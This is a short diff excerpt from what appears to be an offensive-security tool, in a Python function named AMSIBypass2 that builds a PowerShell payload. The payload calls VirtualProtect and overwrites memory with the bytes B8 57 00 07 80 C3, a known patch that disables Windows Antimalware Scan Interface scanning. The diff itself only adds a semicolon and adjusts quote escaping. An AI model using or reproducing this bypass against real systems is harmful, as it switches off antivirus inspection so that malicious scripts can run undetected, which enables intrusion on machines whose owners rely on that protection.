@@ -64,7 +64,7 @@ def AMSIBypass2():
     [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
     $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
 
-    [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6) 
+    [system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6); 
     """
     bypass = bypass.replace('"kernel32"', '`"kernel32`"')
     bypass = bypass.replace('@"','"')
